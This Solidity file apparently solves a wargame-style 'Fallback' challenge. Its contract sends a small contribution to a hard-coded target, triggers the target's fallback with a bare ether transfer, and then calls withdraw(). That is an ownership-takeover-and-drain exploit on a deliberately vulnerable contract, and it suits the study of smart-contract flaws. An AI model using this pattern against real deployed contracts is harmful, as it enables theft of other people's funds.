// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.16;

contract Fallback {
    address constant TARGET = payable(address(0x1D4357eaaE70fdEFD8c161d2Da5082a5bf009558));

    constructor() payable {
    }

    function contribute() external returns(bool) {
        (bool success, ) = TARGET.call{value: 0.00001 ether}(abi.encodeWithSignature("contribute()"));
        return success;
    }

    function _fallback() external returns(bool) {
        (bool success, ) = TARGET.call{value: 0.00001 ether}(abi.encodeWithSignature(""));
        return success;
    }

    function withdraw() external returns(bool) {
        (bool success, ) = TARGET.call(abi.encodeWithSignature("withdraw()"));
        return success;
    }

    receive() external payable  {
    }
}